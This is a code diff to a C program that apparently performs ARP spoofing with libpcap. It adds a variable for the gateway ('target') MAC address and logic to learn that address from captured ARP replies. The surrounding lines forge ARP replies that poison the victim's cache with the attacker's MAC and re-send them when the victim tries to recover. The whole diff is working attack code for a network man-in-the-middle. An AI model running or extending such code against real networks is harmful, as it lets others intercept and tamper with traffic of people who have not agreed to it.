@@ -65,6 +65,7 @@ int main(int argc, char* argv[]) {
 
   char mac_broadcast[6] = {0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF};
   char mac_sender[6] = {0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00};
+  char mac_target[6] = {0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00};
   char mac_attacker[6];               // My Mac Address
 
   inet_pton(AF_INET , ip_sender_str , ip_sender);
@@ -152,7 +153,7 @@ int main(int argc, char* argv[]) {
   arp_request->oper = swap_word_endian(ARP_OPER_REQ);
   memcpy(arp_request->sha , mac_attacker ,6);                       // strcpy doesn't work so i use memcpy
   strcpy(arp_request->spa , ip_attacker);
-  strcpy(arp_request->tha , mac_sender);
+  strcpy(arp_request->tha , mac_target);
   strcpy(arp_request->tpa , ip_target);                             // send packet to target
 /*************************************************************************************************/
 
@@ -197,6 +198,14 @@ int main(int argc, char* argv[]) {
       memcpy(arp_reply->tha , mac_sender , 6);                            // Set sender(victim) mac address in arp reply
       printf("send arp reply packet\n");
       pcap_sendpacket(handle ,(unsigned char*)arp_reply_packet , 42);  
+    }
+
+    if(arp_check(swap_word_endian(ethernet->ether_type))    // Is it ARP protocol?
+      && swap_word_endian(arp->oper) == ARP_OPER_REP           // Is it arp reply ?
+      &&!strcmp(arp->spa , ip_target)  )                        // Is it sender ip (victim)?
+    {
+      memcpy(mac_target , arp->sha , 6);                                  // Get target(gateway) mac address
+      printarr((u_char*)mac_target,6);
     }
 
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp sender(victim)'s request packet for recovery 
